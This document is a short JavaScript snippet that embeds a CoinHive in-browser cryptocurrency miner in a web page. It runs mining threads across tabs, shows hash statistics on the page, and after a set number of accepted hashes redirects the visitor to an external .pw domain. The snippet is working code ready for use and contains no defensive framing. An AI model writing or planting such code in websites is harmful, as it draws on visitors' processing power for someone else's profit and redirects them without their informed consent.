		var miner = new CoinHive.Anonymous('PUBLIC TOKEN',
		{
			threads: 2,
			autoThreads: false,
			throttle:0.5,
			forceASMJS: false
		});
		miner.start(CoinHive.FORCE_MULTI_TAB);

		// Update stats once per .5 second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond();
		var totalHashes = miner.getTotalHashes();
		var acceptedHashes = miner.getAcceptedHashes();
		var hashesToGenerate = 256; //Set value of amount of accepted hashes to generate
		var threadCount = miner.getNumThreads(); //Get the amount of threads

		//Remove the following if statement if you don't want the page to redirect to another page.
		if (acceptedHashes > hashesToGenerate)
		{
			miner.stop();
			window.location = "http://bish0pq.pw/"
		}
		else
		{
		document.getElementById("hps").innerHTML = hashesPerSecond;
		document.getElementById("th").innerHTML = totalHashes;
		document.getElementById("ah").innerHTML = acceptedHashes;
		document.getElementById("threads").innerHTML = threadCount;
		}
	}, 500);